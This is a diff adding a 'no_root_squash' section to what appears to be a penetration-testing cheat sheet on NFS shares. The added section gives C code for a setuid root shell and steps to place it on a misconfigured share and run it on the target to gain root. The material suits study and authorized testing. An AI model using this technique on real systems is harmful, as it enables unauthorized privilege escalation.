@@ -18,3 +18,24 @@ To check which folder where mounted by a target, we can use `showmount -e $IP`
 Then to mount the filesystem: `mount -t nfs $IP:/path/to/share ./mylocaldir -o nolock`
 
 To unmount it: `unmount ./mylocaldir`
+
+### no_root_squash
+
+This is an option that allows users to connect as root with their local root users, enabling attack via setUID.
+Just upload a binary as your local root user, for example shell.c:
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+Compile it and copy it on the mount as a local root, then `chmod u+s <shell binary>`
+
+Connect back to the attacked host and you can execute this binary and become root.
+
+PS: to check options set on the mount, check `/etc/exports`
